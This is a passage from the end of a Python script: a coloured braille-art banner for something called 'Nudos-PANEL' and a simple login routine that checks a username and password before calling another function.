\033[36m                         ⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕
\033[36m                         ⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕
\033[36m                         ⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄
\033[36m                         ⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕
\033[36m                         ⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿
\033[36m                         ⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
\033[36m                         ⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟
\033[36m                         ⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠
\033[36m                         ⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙
\033[36m                         ⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣

                              WELCOME TO Nudos-PANEL
		BEFORE USE OUR PANEL YOU MUST LOGIN TO UR ACCOUNT
                          AUTHOR IN TELEGRAM : @mikamika27⠀⠀
            ''')
    username = input("\033[39m</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("")
        print("\033[36m</> Invalid credentials! Abandoning...")
        sys.exit(1)
    elif username == user and password == passwd:
        p()

login()
